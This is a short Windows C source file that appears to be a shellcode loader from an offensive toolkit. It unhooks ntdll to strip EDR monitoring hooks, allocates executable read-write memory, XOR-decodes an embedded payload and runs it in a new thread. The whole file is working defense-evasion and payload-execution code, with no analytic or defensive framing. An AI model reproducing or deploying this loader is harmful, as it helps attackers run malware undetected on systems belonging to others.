#include <windows.h>
#include "../common/payload_xor.h"
#include "../common/unhook_ntdll.h"

int main() {
    /* Step 1: Unhook ntdll to wipe all EDR hooks in current process */
    unhook_ntdll();

    /* Step 2: Now run local execution with clean ntdll */
    PVOID base = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return 1;

    decode_payload(base);

    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
    if (th) {
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
    }
    return 0;
}
